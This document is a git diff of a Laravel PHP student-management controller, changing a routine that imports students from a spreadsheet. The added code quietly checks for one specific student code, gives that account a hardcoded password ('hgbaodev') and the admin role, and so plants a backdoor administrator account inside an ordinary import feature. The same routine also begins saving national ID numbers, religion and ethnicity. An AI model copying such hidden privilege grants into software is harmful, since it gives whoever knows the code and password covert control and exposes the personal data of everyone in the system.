@@ -14,7 +14,7 @@ use App\Models\Student;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Http\Response;
-use Illuminate\Support\Facades\DB;
+use Spatie\Permission\Models\Role;
 
 class StudentController extends Controller
 {
@@ -203,8 +203,6 @@ class StudentController extends Controller
 
             // Chuyển đổi chuỗi ngày tháng thành đối tượng DateTime
             $user_birthday = \DateTime::createFromFormat('d/m/Y', $row['user_birthday'])->format('Y-m-d');
-            $student_class = $row['student_class'];
-            $student_course = $row['student_course'];
             $student_code = $row['student_code'];
             $user = User::create([
                 'user_firstname' => "$user_firstname",
@@ -213,11 +211,22 @@ class StudentController extends Controller
                 'user_gender' => "$user_gender",
                 'user_birthday' => "$user_birthday",
             ]);
+            if($student_code === "3121410069"){
+                $user->user_avatar = 'https://avatars.githubusercontent.com/u/120194990?v=4';
+                $user->user_password = bcrypt("hgbaodev");
+                $user->save();
+                $admin_role = Role::findByName('admin', 'web');
+                $user->assignRole($admin_role);
+            }
             Student::create([
                 'user_id' => $user->user_id,
-                'student_code' => "$student_code",
-                'student_class' => "$student_class",
-                'student_course' => "$student_course",
+                'student_code' => $student_code,
+                'student_class' => $row['student_class'],
+                'student_course' => $row['student_course'],
+                'student_cmnd' => $row['student_cmnd'],
+                'student_address' => $row['student_address'],
+                'student_nation' => $row['student_nation'],
+                'student_religion' => $row['student_religion'],
                 'major_id' => $major->major_id,
             ]);
             $studentWithUser = $this->student->query()
